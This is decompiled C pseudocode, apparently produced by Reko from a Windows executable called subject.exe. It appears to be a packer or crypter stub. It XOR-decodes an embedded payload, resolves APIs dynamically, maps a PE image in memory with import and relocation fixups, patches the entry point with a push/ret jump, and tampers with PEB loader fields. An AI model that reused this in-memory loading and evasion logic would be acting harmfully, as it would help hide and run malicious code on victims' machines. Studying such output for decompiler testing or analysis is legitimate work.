// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401030: Register (ptr byte) fn00401030(Stack Eq_3 dwArg04, Stack (ptr Eq_4) dwArg08, Stack (ptr Eq_5) dwArg0C)
byte * fn00401030(Eq_3 dwArg04, Eq_4 * dwArg08, Eq_5 * dwArg0C)
{
	globals->dw4072E8 = 0x00;
	while (globals->dw4072E8 < dwArg0C)
	{
		edx = dwArg04 + globals->dw4072E8;
		*edx = (byte) (dwArg08 + globals->dw4072E8);
		globals->dw4072E8 = globals->dw4072E8 + 0x01;
	}
	return edx;
}

// 004010C0: Register Eq_31 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_3 dwLoc18_20 = GetModuleHandleA(null);
	LoadIconA(null, (CHAR *) 0x7F00);
	globals->dw4072E8 = 1169;
	globals->t4072F0 = dwArg04;
	if ((globals->t4072F0 & 0xFFFF) != 0x00)
		globals->dw407300 = 0x00;
	else
		globals->dw407300 = 0x01;
	if (globals->t4072F0 == 0x00)
		globals->dw407300 = 0x00;
	if (globals->dw407300 != 0x00)
		dwLoc18_20 = globals->t4072F0;
	GetWindowsDirectoryA(fp - 332, 0xE6);
	lstrcatA(fp - 332, &globals->t407290);
	if (CreateFileA(fp - 332, 0x80, 0x03, null, 0x03, 0x80, null) != (void *) ~0x00)
	{
		lstrcatA(fp - 332, &globals->t4072A4);
		if (CreateFileA(fp - 332, 0x80, 0x03, null, 0x03, 0x80, null) == (void *) ~0x00)
		{
			globals->dw4072E8 = 0x0222;
			globals->dw4072E8 = 6846;
			struct Eq_137 * dwLoc08_159 = null;
			while (dwLoc08_159 < (struct Eq_137 *) 0x5200)
			{
				GetModuleHandleA(null);
				dwLoc08_159->dw402001 = dwLoc08_159 + dwLoc08_159->dw402001 / 0x08;
				dwLoc08_159->dw402001 = (char *) &dwLoc08_159->dw402001 + 41364171 ^ dwLoc08_159->dw402001;
				dwLoc08_159 = dwLoc08_159 + 0x01;
			}
			globals->t4072FC = fn004019B0(0x5200);
			fn00401030(globals->t4072FC, globals->a402001, (struct Eq_5 *) 0x5200);
			globals->dw4072EC = edi;
			globals->dw4072E4 = esi;
			globals->dw4072F8 = ebx;
			globals->ptr407308 = fs->ptr0018;
			globals->ptr4072F4 = fp - 0x04;
			globals->t407304 = GetModuleHandleA(&globals->t4072C0);
			Eq_178 dwLoc08_223 = 0x00;
			while (dwLoc08_223 < 0x07)
			{
				(&globals->ptr407320)[dwLoc08_223] = fn00401350(globals->t407304, dwLoc08_223 *s 0x13 + 0x00407208);
				dwLoc08_223 = (word32) dwLoc08_223 + 0x01;
			}
			word32 ebp_261 = fn004019E0(fp - 0x04, 4199163 - dwLoc18_20, dwLoc18_20);
			Eq_3 ecx_264 = globals->t4072FC;
			*(fp - 0x015C) = (union Eq_3 *) ecx_264;
			word32 eax_268 = fn004013A0(ebp_261, dwArg00);
			struct Eq_170 * esp_272 = globals->ptr4072F4;
			if (globals->dw407300 != 0x00)
				esp_272->t0008 = globals->t4072FC;
			word32 esp_276;
			word32 ebp_277;
			byte SCZO_278;
			word32 ebx_279;
			word32 esi_280;
			word32 edi_281;
			Eq_31 eax_282;
			byte SZO_283;
			byte C_284;
			byte Z_285;
			word32 ecx_286;
			word32 edx_287;
			struct Eq_264 * fs_288;
			globals->ptr40733C();
			return eax_282;
		}
	}
	return 0x00;
}

// 00401350: Register Eq_272 fn00401350(Stack Eq_3 dwArg04, Stack (ptr Eq_4) dwArg08)
FARPROC fn00401350(Eq_3 dwArg04, Eq_4 * dwArg08)
{
	return GetProcAddress(dwArg04, dwArg08);
}

// 00401370: Register word32 fn00401370(Stack Eq_3 dwArg04)
word32 fn00401370(Eq_3 dwArg04)
{
	globals->dw4072E8 = 0x01;
	word32 * edx_13 = dwArg04 + 0x78 + globals->dw4072E8 * 0x08;
	GetCommandLineA();
	return *edx_13;
}

// 004013A0: Register word32 fn004013A0(Register word32 ebp, Stack word32 dwArg04)
word32 fn004013A0(word32 ebp, word32 dwArg04)
{
	if (globals->dw407300 != 0x00)
	{
		Eq_3 eax_757 = globals->t4072F0;
		dwLoc08 = (word32) *((word32) *((word32) eax_757 + 0x003C) + ((word32) eax_757 + 0x0050));
	}
	struct Eq_305 * ecx_20 = dwArg04 + dwArg04->dw003C / 0x0040;
	struct Eq_311 * edx_26 = &ecx_20->w0014 + 0x02 + (word32) ecx_20->w0014 / 0x0040;
	struct Eq_311 * dwLoc28_27 = edx_26;
	ptr32 esp_38;
	word32 ebp_39;
	byte SCZO_40;
	word32 esi_41;
	byte Z_42;
	Eq_3 eax_43;
	word32 ecx_44;
	word32 edx_45;
	byte C_46;
	byte SZO_47;
	word16 cx_48;
	globals->ptr40732C();
	*(esp_38 - 0x04) = dwArg04->dw003C + 0x0138 + (word32) ecx_20->w0006 *s 0x28;
	*(esp_38 - 0x08) = (struct Eq_4 **) dwArg04;
	*(esp_38 - 0x0C) = (union Eq_3 *) eax_43;
	fn00401030(dwArg00, dwArg04, dwArg08);
	uint32 dwLoc14_70 = 0x00;
	while (dwLoc14_70 < (word32) ecx_20->w0006)
	{
		if (dwLoc28_27->dw0014 != 0x00 && dwLoc28_27->dw0010 != 0x00)
		{
			*(esp_38 - 0x04) = (uint32) ((uint64) (uint32) ((word32) ecx_20->t003C + (dwLoc28_27->dw0010 - 0x01)) /u ecx_20->t003C) *s ecx_20->t003C;
			*(esp_38 - 0x08) = dwArg04 + dwLoc28_27->dw0014 / 0x0040;
			*(esp_38 - 0x0C) = (word32) eax_43 + dwLoc28_27->dw000C;
			fn00401030(dwArg00, dwArg04, dwArg08);
		}
		dwLoc28_27 = dwLoc28_27 + 0x01;
		dwLoc14_70 = dwLoc14_70 + 0x01;
	}
	word32 dwLoc10_147;
	word32 ecx_134 = eax_43 + Mem64[eax_43 + 0x3C:word32];
	*(esp_38 - 0x04) = (struct Eq_383 **) ecx_134;
	ptr32 esp_141 = esp_38;
	struct Eq_394 * dwLocB8_144 = (word32) eax_43 + fn00401370(dwArg00);
	if (globals->dw407300 == 0x00)
	{
		*(esp_38 - 0x04) = 0x00;
		word32 ecx_728 = ecx_134->dw0050;
		*(esp_38 - 0x08) = ecx_728;
		*(esp_38 - 0x0C) = 0x00;
		*(esp_38 - 0x10) = 0x04;
		*(esp_38 - 0x14) = 0x00;
		*(esp_38 - 0x18) = ~0x00;
		word32 ebp_745;
		byte SCZO_746;
		word32 esi_747;
		byte Z_748;
		word32 eax_749;
		word32 ecx_750;
		word32 edx_751;
		byte C_752;
		byte SZO_753;
		word16 cx_754;
		globals->ptr407324();
		dwLoc10_147 = eax_749;
	}
	else
		dwLoc10_147 = 0x00;
	while (dwLocB8_144->dw0010 != 0x00)
	{
		word32 * dwLoc34_188;
		ui32 * dwLoc24_187;
		ptr32 ecx_167 = (word32) eax_43 + dwLocB8_144->dw000C;
		ptr32 * esp_169 = esp_141 - 0x04;
		*esp_169 = ecx_167;
		ptr32 esp_171;
		word32 ebp_172;
		byte SCZO_173;
		word32 esi_174;
		byte Z_175;
		word32 eax_176;
		word32 ecx_177;
		word32 edx_178;
		byte C_179;
		byte SZO_180;
		word16 cx_181;
		globals->ptr407338();
		GetCommandLineA();
		if (dwLocB8_144->dw0000 != 0x00)
		{
			dwLoc24_187 = (word32) eax_43 + dwLocB8_144->dw0000;
			GetCommandLineA();
			dwLoc34_188 = (word32) eax_43 + dwLocB8_144->dw0010;
		}
		else
		{
			dwLoc24_187 = (word32) eax_43 + dwLocB8_144->dw0010;
			GetCommandLineA();
			dwLoc34_188 = (word32) eax_43 + dwLocB8_144->dw0000;
		}
		word32 dwLoc18_191 = 0x00;
		if (dwLocB8_144->dw0010 != 0x00 && dwLocB8_144->dw0000 != 0x00)
			dwLoc18_191 = 0x01;
		while (true)
		{
			esp_141 = esp_171;
			if (*dwLoc24_187 == 0x00)
				break;
			if ((*dwLoc24_187 & 0x80000000) != 0x00)
			{
				*(esp_171 - 0x04) = *dwLoc24_187 & 0x7FFFFFFF;
				*(esp_171 - 0x08) = eax_176;
				*dwLoc24_187 = fn00401350(dwArg00, dwArg04);
			}
			else
			{
				*(esp_171 - 0x04) = (word32) eax_43 + (*dwLoc24_187 + 0x02);
				*(esp_171 - 0x08) = eax_176;
				*dwLoc24_187 = fn00401350(dwArg00, dwArg04);
			}
			if (dwLoc18_191 != 0x00)
				*dwLoc34_188 = *dwLoc24_187;
			GetCommandLineA();
			dwLoc24_187 = dwLoc24_187 + 0x01;
			dwLoc34_188 = dwLoc34_188 + 0x01;
		}
		GetCommandLineA();
		dwLocB8_144 = dwLocB8_144 + 0x01;
	}
	if (globals->dw407300 == 0x00)
	{
		Eq_3 eax_696 = ecx_134->t0034;
		union Eq_3 * esp_698 = esp_141 - 0x04;
		*esp_698 = (union Eq_3 *) eax_696;
		*(esp_698 - 0x04) = 0x00;
		*(esp_698 - 0x08) = 0x00;
		*(esp_698 - 0x0C) = 0x00;
		*(esp_698 - 0x10) = 0x22;
		*(esp_698 - 0x14) = dwLoc10_147;
		word32 ebp_712;
		byte SCZO_713;
		word32 esi_714;
		byte Z_715;
		Eq_3 eax_716;
		word32 ecx_717;
		word32 edx_718;
		byte C_719;
		byte SZO_720;
		word16 cx_721;
		globals->ptr407334();
		globals->t4072E0 = eax_716;
	}
	else
		&globals->t4072E0.u0->unused = 0x00;
	word32 eax_324;
	if (globals->t4072E0 == 0x00)
	{
		if (globals->dw407300 != 0x00)
			dwLoc0C = globals->t4072F0;
		else
			dwLoc0C = ecx_134->t0034;
		union Eq_3 * esp_551 = esp_141 - 0x04;
		*esp_551 = (union Eq_3 *) dwLoc0C;
		word32 ebp_554;
		byte SCZO_555;
		word32 esi_556;
		byte Z_557;
		word32 eax_558;
		word32 ecx_559;
		word32 edx_560;
		byte C_561;
		byte SZO_562;
		word16 cx_563;
		ptr32 esp_553;
		globals->ptr407320();
		if (eax_558 == 0x00)
		{
			*(esp_553 - 0x04) = 0x8000;
			*(esp_553 - 0x08) = 0x00;
			*(esp_553 - 0x0C) = (union Eq_3 *) dwLoc0C;
			word32 ebp_671;
			byte SCZO_672;
			word32 esi_673;
			byte Z_674;
			word32 eax_675;
			word32 ecx_676;
			word32 edx_677;
			byte C_678;
			byte SZO_679;
			word16 cx_680;
			globals->ptr407330();
			if (eax_675 == 0x00)
			{
				eax_324 = 0x00;
				return eax_324;
			}
		}
		if (globals->dw407300 == 0x00)
		{
			Eq_3 edx_579 = ecx_134->t0034;
			union Eq_3 * esp_580 = esp_553 - 0x04;
			*esp_580 = (union Eq_3 *) edx_579;
			*(esp_580 - 0x04) = 0x00;
			*(esp_580 - 0x08) = 0x00;
			*(esp_580 - 0x0C) = 0x00;
			*(esp_580 - 0x10) = 0x22;
			*(esp_580 - 0x14) = dwLoc10_147;
			word32 ebp_594;
			byte SCZO_595;
			word32 esi_596;
			byte Z_597;
			Eq_3 eax_598;
			word32 ecx_599;
			word32 edx_600;
			byte C_601;
			byte SZO_602;
			word16 cx_603;
			globals->ptr407334();
			globals->t4072E0 = eax_598;
			if (globals->t4072E0 == 0x00)
			{
				*(esp_141 - 0x04) = 0x40;
				*(esp_141 - 0x08) = 0x3000;
				word32 edx_623 = ecx_134->dw0050;
				*(esp_141 - 0x0C) = edx_623;
				Eq_3 ecx_627 = ecx_134->t0034;
				*(esp_141 - 0x10) = (union Eq_3 *) ecx_627;
				word32 ebp_631;
				byte SCZO_632;
				word32 esi_633;
				byte Z_634;
				Eq_3 eax_635;
				word32 ecx_636;
				word32 edx_637;
				byte C_638;
				byte SZO_639;
				word16 cx_640;
				globals->ptr40732C();
				globals->t4072E0 = eax_635;
			}
		}
		else
		{
			word32 * esp_642 = esp_553 - 0x04;
			*esp_642 = 0x40;
			*(esp_642 - 0x04) = 0x3000;
			*(esp_642 - 0x08) = dwLoc08;
			*(esp_642 - 0x0C) = (union Eq_3 *) dwLoc0C;
			word32 ebp_653;
			byte SCZO_654;
			word32 esi_655;
			byte Z_656;
			word32 eax_657;
			word32 ecx_658;
			word32 edx_659;
			byte C_660;
			byte SZO_661;
			word16 cx_662;
			globals->ptr40732C();
		}
	}
	if (globals->dw407300 == 0x00)
	{
		word32 * esp_366 = esp_141 - 0x04;
		*esp_366 = ecx_134->dw0050;
		*(esp_366 - 0x04) = (union Eq_3 *) eax_43;
		Eq_3 ecx_371 = globals->t4072E0;
		*(esp_366 - 0x08) = (union Eq_3 *) ecx_371;
		fn00401030(dwArg00, dwArg04, dwArg08);
		*esp_366 = dwLoc10_147;
		ptr32 esp_385;
		word32 ebp_386;
		byte SCZO_387;
		word32 esi_388;
		byte Z_389;
		word32 eax_390;
		word32 ecx_391;
		word32 edx_392;
		byte C_393;
		byte SZO_394;
		word16 cx_395;
		globals->ptr407328();
		*(esp_385 - 0x04) = (union Eq_3 *) globals->t4072E0;
		fn00401B30(dwArg00);
		Mem404[0x0040733C:word32] = Mem398[0x004072E0:word32] + Mem398[ecx_134 + 0x28:word32];
		ecx_134->ptr0028 = globals->ptr40733C;
	}
	else
	{
		globals->t4072E0 = eax_43;
		ptr32 ecx_412 = eax_43 - ecx_134->t0034;
		if (ecx_134->dw00A4 != 0x00)
		{
			struct Eq_1121 * dwLoc20_477 = (word32) eax_43 + ecx_134->dw00A0;
			while (dwLoc20_477->t0004 != 0x00)
			{
				uint32 ecx_492 = dwLoc20_477->t0004 - 0x08 >> 0x01;
				word16 edx_495[] = (char *) &dwLoc20_477->t0004 + 0x04;
				uint32 dwLoc14_498 = 0x00;
				while (dwLoc14_498 < ecx_492)
				{
					if ((word32) edx_495[dwLoc14_498] >> 0x0C == 0x03)
						(word32) eax_43 + dwLoc20_477->dw0000 + ((word32) edx_495[dwLoc14_498] & 0x0FFF) = (struct Eq_1164 *) ((word32) eax_43 + dwLoc20_477->dw0000 + ((word32) edx_495[dwLoc14_498] & 0x0FFF) + ecx_412);
					dwLoc14_498 = dwLoc14_498 + 0x01;
				}
				dwLoc20_477 = dwLoc20_477 + Mem409[dwLoc20_477 + 0x04:word32];
			}
		}
		Mem427[0x0040733C:word32] = Mem409[0x004072E0:word32] + Mem409[ecx_134 + 0x28:word32];
		word32 ecx_430 = dwLoc0C + Mem427[ecx_134 + 0x28:word32];
		ecx_134->w0016 = (word16) ((word32) ecx_134->w0016 | 0x2000);
		union Eq_3 * esp_441 = esp_141 - 0x04;
		*esp_441 = (union Eq_3 *) (fp - 0xC0);
		*(esp_441 - 0x04) = 0x40;
		*(esp_441 - 0x08) = 0x06;
		*(esp_441 - 0x0C) = (struct Eq_1010 **) ecx_430;
		VirtualProtect(*(esp_441 - 0x0C), *(esp_441 - 0x08), *(esp_441 - 0x04), *esp_441);
		ecx_430->b0000 = 0x68;
		ecx_430->ptr0001 = globals->ptr40733C;
		ecx_430->b0005 = 0xC3;
		globals->t4072FC = globals->t4072E0;
		*esp_441 = (union Eq_3 *) globals->t4072E0;
		Mem467[esp_441 - 0x04 + 0x00:word32] = Mem461[0x004072E0:word32] + Mem461[ecx_134 + 0x28:word32];
		*(esp_441 - 0x08) = (union Eq_3 *) globals->t4072F0;
		fn00401930(dwArg00, dwArg04, dwArg08);
	}
	eax_324 = 0x01;
	return eax_324;
}

// 00401930: void fn00401930(Stack Eq_3 dwArg04, Stack (ptr Eq_4) dwArg08, Stack (ptr Eq_5) dwArg0C)
void fn00401930(Eq_3 dwArg04, Eq_4 * dwArg08, Eq_5 * dwArg0C)
{
	struct Eq_1186 * ecx_14 = globals->ptr407308->ptr0030->ptr000C->ptr000C;
	struct Eq_1186 * dwLoc0C_15 = ecx_14;
	if (0x01 != 0x00)
	{
		if (dwLoc0C_15 == null)
			return;
		if (dwLoc0C_15->dw0018 == dwArg04)
		{
			dwLoc0C_15->dw001C = dwArg08;
			dwLoc0C_15->dw0018 = dwArg0C;
			return;
		}
		struct Eq_1186 * edx_57 = dwLoc0C_15->ptr0000;
		dwLoc0C_15 = edx_57;
		if (edx_57 != ecx_14)
			goto l00401956;
	}
	return;
}

// 004019B0: Register Eq_1053 fn004019B0(Stack word32 dwArg04)
LPVOID fn004019B0(word32 dwArg04)
{
	GetCommandLineA();
	return HeapAlloc(GetProcessHeap(), 0x00, dwArg04);
}

// 004019E0: Register ptr32 fn004019E0(Register ptr32 ebp, Stack word32 dwArg04, Stack Eq_3 dwArg08)
ptr32 fn004019E0(ptr32 ebp, word32 dwArg04, Eq_3 dwArg08)
{
	struct Eq_1236 * edx_16 = dwArg08 + dwArg08->dw003C / 0x0040;
	ptr32 esp_29;
	ptr32 ebp_30;
	byte SCZO_31;
	word32 esi_32;
	Eq_3 eax_33;
	word32 ecx_34;
	word32 edx_35;
	byte Z_36;
	byte C_37;
	byte SZO_38;
	globals->ptr40732C();
	globals->t4072E0 = eax_33;
	if (globals->t4072E0 != 0x00)
	{
		*(esp_29 - 0x04) = edx_16->dw0050;
		*(esp_29 - 0x08) = (struct Eq_5 **) dwArg08;
		*(esp_29 - 0x0C) = (union Eq_3 *) globals->t4072E0;
		fn00401030(dwArg00, dwArg04, dwArg08);
		ui32 eax_82 = globals->t4072E0 - dwArg08;
		if (edx_16->dw00A4 != 0x00)
		{
			struct Eq_1301 * dwLoc0C_109 = dwArg08 + edx_16->dw00A0 / 0x0040;
			while (dwLoc0C_109->t0004 != 0x00)
			{
				uint32 eax_124 = dwLoc0C_109->t0004 - 0x08 >> 0x01;
				word16 ecx_127[] = (char *) &dwLoc0C_109->t0004 + 0x04;
				uint32 dwLoc08_130 = 0x00;
				while (dwLoc08_130 < eax_124)
				{
					if ((word32) ecx_127[dwLoc08_130] >> 0x0C == 0x03)
						(word32) globals->t4072E0 + dwLoc0C_109->dw0000 + ((word32) ecx_127[dwLoc08_130] & 0x0FFF) = (struct Eq_1346 *) ((word32) globals->t4072E0 + dwLoc0C_109->dw0000 + ((word32) ecx_127[dwLoc08_130] & 0x0FFF) + eax_82);
					dwLoc08_130 = dwLoc08_130 + 0x01;
				}
				dwLoc0C_109 = dwLoc0C_109 + Mem76[dwLoc0C_109 + 0x04:word32];
			}
		}
		Mem101[esp_29 - 0x04 + 0x00:word32] = dwArg04 + Mem76[0x004072E0:word32];
		return ebp_30;
	}
	else
		return ebp;
}

// 00401B30: void fn00401B30(Stack Eq_3 dwArg04)
void fn00401B30(Eq_3 dwArg04)
{
	globals->ptr407308->ptr0030->dw0008 = dwArg04;
	return;
}

